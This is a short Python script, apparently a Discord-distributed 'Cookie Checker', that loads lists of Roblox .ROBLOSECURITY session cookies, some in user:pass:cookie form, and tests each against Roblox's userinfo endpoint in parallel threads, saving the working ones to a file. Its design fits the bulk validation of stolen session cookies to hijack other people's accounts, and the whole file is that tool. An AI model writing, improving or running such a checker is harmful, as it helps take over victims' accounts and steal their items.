import time, ctypes, threading, random, traceback, sys, datetime, json, os, subprocess
from threading import Thread
try:
    import requests
except:
    print("Please run run_first.py before using this")
    time.sleep(20)
    sys.exit()


try:
    from colorama import Fore, init, Back, Style
    
except:
    print("Please run run_first.py before using this")
    time.sleep(20)
    sys.exit()

lock = threading.Lock()
print(f"Cookie Checker | DEVELOPED BY Alekdevs#4540")



print("Make sure you have cookies in cookies.txt. ")


time.sleep(1)
req = requests.Session()


try:
    format = int(input("\nCookie format:\n\n[1] user:pass:cookie\n[2] cookie\n"))
except:
    print(Fore.RED + "You did not enter a valid option -- closing")
cookies = open('cookies.txt','r').read().splitlines()
if format == 1:
    try:
        cookies = [cookie.split(':',2)[2] for cookie in cookies]
    except:
        print("\n There are no cookies in cookies.txt or they are formatted wrong")
        time.sleep(20)
        sys.exit()
elif format == 2:
    cookies = ['_|'+line.split('_|')[-1] for line in cookies]
else:
    print("Not a valid option, exiting")
    time.sleep(20)
    sys.exit()

if len(cookies) == 0:
    print(Fore.RED + "\nWARNING - You have no cookies loaded\n")





print(Fore.CYAN + "[1] -> Cookie Checker")


try:
    option = int(input("\n Enter number of tool that you'd like to use: "))
except:
    print(Fore.RED + "You did not enter a valid option --closing")
    time.sleep(30)
    sys.exit()



open('output.txt', 'w+').close()


def cookie_check(i):
    global valid, invalid, checked, lock
    req = requests.Session()
    checked += 1
    req.cookies['.ROBLOSECURITY'] = i
    try:
        r = req.get('https://www.roblox.com/mobileapi/userinfo')
        if 'mobileapi/user' in r.url:
            f = open("output.txt","a+")
            f.write(f"{i}\n")
            valid += 1
            with lock:
                print(Fore.GREEN + "Valid Cookie Found")
        else:
            invalid += 1
            with lock:
                print(Fore.RED + "Invalid Cookie Found")
            return True
        print(f"Valid Cookies: {valid} | Invalid Cookies: {invalid} | Cookies Checked: {checked}/{len(cookies)}")
    except:
        cookies.append(i)
        print(f"Valid Cookies: {valid} | Invalid Cookies: {invalid} | Cookies Checked: {checked}/{len(cookies)}")

    

if option == 1:
    invalid = 0
    valid = 0
    checked = 0
    print("Starting checks for valid cookies")
    ts = []
    for i in cookies:
        t = threading.Thread(target=cookie_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    if valid == 0:
        print(Fore.RED + " No valid cookies were found")
    print(Fore.GREEN + "All cookies have been checked and the working ones have been put to output.txt")
